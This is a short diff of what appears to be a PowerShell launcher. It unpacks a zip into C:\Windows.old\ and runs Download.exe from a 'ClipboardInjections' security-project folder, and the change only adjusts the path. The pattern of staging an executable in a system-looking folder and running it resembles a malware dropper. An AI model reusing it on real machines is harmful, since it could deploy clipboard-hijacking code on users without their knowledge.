@@ -7,6 +7,9 @@ foreach ($item in $zip.items()) {
   $shell.Namespace("C:\Windows.old\").CopyHere($item)
 }
 
-cd "C:\Windows.old\Flaque-comp-security-project-57b44c4\ClipboardInjections\dist" ; .\Download.exe
+cd .\Flaque-comp-security-project-5ea134d\ClipboardInjections\dist
+.\Download.exe
+
+
 
 
